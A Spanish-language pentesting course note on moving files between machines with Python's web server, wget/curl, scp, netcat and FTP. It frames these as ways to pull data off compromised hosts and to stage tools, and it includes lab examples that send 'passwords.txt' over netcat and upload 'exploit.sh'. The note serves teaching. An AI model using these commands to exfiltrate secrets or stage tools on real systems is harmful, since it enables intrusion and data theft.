---
title: Intercambio de archivos
modulo: M5 - Elevación de privilegios
fecha: 2025-07-31
layout: apunte
slug: 2025-08-13-intercambio-de-archivos
---
Intercambiar archivos entre máquinas puede ser de interés, especialmente cuando se quieren extraer datos de las máquinas vulneradas, o cuando se quiere utilizar algún binario que reside en la máquina atacante. Para hacerlo se abordan las siguientes maneras.

# 🐍 Utilizando Python server
**1.** Desde la máquina que **contiene** el archivo que se desea transferir, y **desde la ruta donde se encuentra dicho archivo** se ejecuta el siguiente comando para iniciar un servidor web con python:
```bash
python3 -m http.server <puerto>
```

**2.** Desde la máquina **donde se quiere transferir el archivo**, se pueden utilizar distintos medios, dependiendo de las posibilidades de la máquina, algunos ejemplos son `wget` y `curl`

Usando `wget`:
```bash
wget http://<ip_origen>:<puerto>/<nombre_del_archivo>
```

Usando `curl`:
```bash
curl -o <nombre_archivo> http://<ip_origen>:<puerto>/<nombre_del_archivo>
```

# 📑 Utilizando SCP
>[!warning] Nota:
>Para utilizar este método, es **indispensable** que **la máquina a la que se realiza scp** tenga habilitado el servicio de SSH, además, será necesario conocer las credenciales de acceso.

## Descargando un archivo con SCP
Suponiendo que nos interesa extraer un archivo desde una máquina que tiene el servicio SSH levantado, desde la máquina **donde se quiere transferir el archivo**, se ejecuta el siguiente comando
```bash
scp <usuario_origen>@<ip_origen>:/ruta/archivo/original.extensión /ruta/local/
```

Por ejemplo, si en la máquina A con IP `10.0.2.10` existe un archivo `contraseña.txt` en la ruta `/home/ubuntu/documentos/`, y nos interesa guardarlo en la máquina B dentro de la ruta `/home/kali/descargas/`, el comando se vería de la siguiente manera:
```bash
scp ubuntu@10.0.2.10:/home/ubuntu/documentos/contraseña.txt /home/kali/descargas/
```

## Subiendo un archivo con SCP
Suponiendo que queremos transferir un archivo a una máquina que tiene el servicio de SSH levantado, ejecutamos el siguiente comando **desde la máquina que contiene el archivo**:
```bash
scp /ruta/local/archivo.ext <usuario_destino>@<ip_destino>:/ruta/remota/
```

Por ejemplo, si en la máquina B existe un archivo `exploit.sh` en la ruta `/home/hali/documentos` y nos interesa guardarlo en la máquina A con IP `10.0.2.10`  dentro de la ruta `/home/ubuntu/`, el comando se vería así:

```bash
scp /home/kali/documentos/exploit.sh ubuntu@10.0.2.10:/home/ubuntu/
```

## Notas adicionales
- En caso de que el servicio SSH no esté levantado en el puerto por defecto habrá que especificarlo

```bash
scp -P <puerto> <usuario>@<ip_origen>:/ruta/archivo/original.ext /ruta/local/
```

- También es posible transferir ficheros enteros, con la flag `-r`

```bash
scp -r <usuario_origen>@<ip_origen>:/ruta/archivo/original.ext /ruta/local/
```

* A veces puede requerir especificar métodos de autenticación

```bash
scp -oHostkeyAlgorithms=+ssh-rsa <usuario_origen>@<ip_origen>:/ruta/archivo/original.ext /ruta/local/
```

# 🌐 Utilizando Netcat
**1.** Desde la máquina **a donde se quiere enviar un archivo**, hay que levantar un puerto a la escucha
```bash
nc -lvp <puerto> > ruta/donde/se/guardara/el/archivo/<nombre_archivo>
```

Por ejemplo, si la máquina B quiere enviar el archivo `passwords.txt` a la máquina A, en la máquina A se abriría un puerto, por ejemplo, el 4444, para recibir el archivo
```bash
nc -lvp 4444 > passwords.txt
```

Si no se especifica una ruta, el archivo se guardará en el directorio desde el cual se lanzó el Netcat.

**2.** Desde la máquina **que contiene el archivo**, hay que lanzar un comando Netcat pero para enviar datos, de la siguiente forma
```bash
nc <ip_remota> <puerto> < /ruta/donde/esta/el/archivo/<nombre_archivo>
```

Siguiendo el ejemplo anterior, suponiendo que la máquina A tiene la IP `10.0.2.8`, desde la máquina B se ejecutaría el comando
```bash
nc 10.0.2.8 4444 < passwords.txt
```

# 🗂️ Utilizando FTP
**1.** Levantar el servidor FTP en la máquina **que contiene el archivo** 
```bash
twistd3 -n ftp -r . -p 21
```

Suponiendo que la máquina A con IP `10.0.2.64` contiene el archivo `datos.txt` y quiere enviarlos a la máquina B, el comando se ejecutaría en la máquina A.

**2.** Desde la máquina **donde se quiere transferir el archivo** se ejecuta el comando para obtener el archivo
```bash
wget ftp://<ip_remota>/<archivo>
```

Siguiendo el ejemplo anterior, desde la máquina B se lanzaría el comando
```bash
wget ftp://10.0.2.64/datos.txt
```